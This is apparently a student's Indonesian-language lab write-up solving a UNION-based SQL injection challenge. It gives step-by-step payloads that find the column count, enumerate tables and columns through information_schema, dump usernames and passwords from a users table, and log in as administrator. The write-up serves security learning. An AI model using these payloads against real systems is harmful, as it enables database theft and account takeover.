# Soal Mandiri 5 
SQL Injection Attack – Listing the Database Contents (Non-Oracle)
1. Challenge Overview

Lab ini menguji kemampuan melakukan SQL Injection pada database non-Oracle (misalnya MySQL atau PostgreSQL) untuk mengambil isi database, termasuk tabel, kolom, dan data user yang tersimpan.

2. Tools Used

Burp Suite → Proxy & Repeater untuk intercept dan modifikasi request.

Browser → untuk memverifikasi hasil akhir.

3. Step-by-Step Solution
Step 1: Identifikasi Parameter Rentan

Parameter category pada endpoint:

GET /filter?category=Pets


diberikan input ' dan menimbulkan error SQL.
Kesimpulan: parameter category rentan SQL Injection.

Step 2: Menentukan Jumlah Kolom

Dilakukan uji payload:

' UNION SELECT NULL,NULL--

<img width="975" height="516" alt="image" src="https://github.com/user-attachments/assets/d15d1a9c-3d50-4a07-b358-74f0c45a72a5" />

Hasilnya berhasil dijalankan → berarti query memiliki 2 kolom output.

Step 3: Enumerasi Nama Tabel

Gunakan payload untuk membaca tabel dari information_schema.tables:

' UNION SELECT table_name,NULL FROM information_schema.tables--

<img width="975" height="514" alt="image" src="https://github.com/user-attachments/assets/2cc2a93e-bc2f-4409-88d1-bf35494ef90a" />

Hasilnya menampilkan daftar tabel, salah satunya adalah users.

Step 4: Enumerasi Nama Kolom

Setelah tahu ada tabel users, langkah berikutnya menampilkan kolomnya:

' UNION SELECT column_name,NULL 
FROM information_schema.columns 
WHERE table_name='users'--

<img width="975" height="515" alt="image" src="https://github.com/user-attachments/assets/f51c6be5-d702-454b-8893-cfd429569814" />

Hasilnya memunculkan kolom:

id

username

password

Step 5: Dump Isi Data

Gunakan payload untuk menampilkan data dalam tabel users:

' UNION SELECT username,password FROM users--

<img width="975" height="514" alt="image" src="https://github.com/user-attachments/assets/295bfdc9-dc24-4675-bc60-3c76fa9ae7d7" />

Hasilnya menampilkan username dan password dari user yang ada di database, termasuk akun administrator.

Step 6: Login dengan Data Ekstrak

Dengan username administrator dan password yang berhasil didump, dilakukan login pada halaman:

/login

<img width="975" height="492" alt="image" src="https://github.com/user-attachments/assets/d695fa4b-e7e1-44f0-ae2e-b20376beb8c7" />

Hasil: berhasil masuk sebagai administrator, menandakan challenge selesai.

4. Hasil

Berhasil enumerasi database → menemukan tabel users.

Berhasil dump kolom sensitif username dan password.

Berhasil login menggunakan kredensial administrator

<img width="975" height="492" alt="image" src="https://github.com/user-attachments/assets/4715802e-5be0-4669-8ee1-16e895d24898" />
